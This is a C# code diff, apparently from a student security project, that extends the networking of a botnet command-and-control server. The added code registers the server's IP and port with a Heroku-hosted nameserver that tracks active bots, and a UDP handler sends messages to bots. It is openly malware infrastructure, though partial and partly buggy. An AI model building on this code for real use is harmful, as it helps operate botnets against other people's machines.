@@ -1,5 +1,7 @@
-﻿using System;
+﻿using Newtonsoft.Json.Linq;
+using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Linq;
 using System.Net;
 using System.Net.Http;
@@ -14,18 +16,19 @@ namespace Coms4507_Project.BotHandling
         private readonly UdpClient udpClient;
         private readonly int portNumber = 45920;
         private IPEndPoint endpoint;
+        private string publicIp;
+        private NameserverContactHandler nameserverContactor;
 
-        public NetworkHandler()
+        public NetworkHandler(string ip)
         {
+            publicIp = ip;
             udpClient = new UdpClient(portNumber);
             endpoint = new IPEndPoint(IPAddress.Any, portNumber);
+            nameserverContactor = new NameserverContactHandler(ip);
+
+            // Now we go ahead and try to contact the nameserver for bots.
         }
 
-        /// <summary>
-        /// Send data back to the specified IP Address.
-        /// </summary>
-        /// <param name="message">the contents of the message to be sent back.</param>
-        /// <param name="addr">the CIDR IP address (192.168.0.1)</param>
         public void SendMessage(string message, string addr)
         {
             IPEndPoint client = new IPEndPoint(new IPAddress(Encoding.UTF8.GetBytes(addr)), portNumber);
@@ -33,10 +36,6 @@ namespace Coms4507_Project.BotHandling
             _ = udpClient.Send(dataB, dataB.Length, client);
         }
 
-        /// <summary>
-        /// Wait for a message.
-        /// </summary>
-        /// <returns>String containing what the server received in a packet.</returns>
         public string WaitForMessage()
         {
             byte[] dataB = udpClient.Receive(ref endpoint); // This is blocking.
@@ -47,27 +46,27 @@ namespace Coms4507_Project.BotHandling
     }
 
 
-    /// <summary>
-    /// The purpose of this is to contact the DNS server that we've written. It has information regarding all active bots and engages in the handoff that we use between 
-    /// the bots and the C2 server.
-    /// </summary>
+    // =========================== [ NAMESERVER INTERACTIONS ARE DONE HERE ] ===========================
+
     internal class NameserverContactHandler
     {
         private readonly HttpClient httpClient;
-
-        public NameserverContactHandler()
+        private string webserverIp = "https://athena-nameserver.herokuapp.com";
+        private string ip;
+        public NameserverContactHandler(string ip)
         {
+            this.ip = ip;
             httpClient = new HttpClient();
-        }
-
-        public string GetBotIPs()
-        {
-            return "";
-        }
-
-        public string GetServerStatus()
-        {
-            return "";
+            Dictionary<string, string> dict = new Dictionary<string, string>
+            {
+                { "ip", ip },
+                { "port", Convert.ToString(25565) }
+            };
+            JObject firstContact = new JObject(dict);
+            Task<HttpResponseMessage> response = httpClient.PostAsync(webserverIp + "/api/lookup/c2/update", new StringContent(firstContact.ToString()));
+            response.Wait();
+            string botIP = response.Result.Content.ReadAsStringAsync().Result;
+            Trace.WriteLine("Bot IP: ", botIP);
         }
 
     }
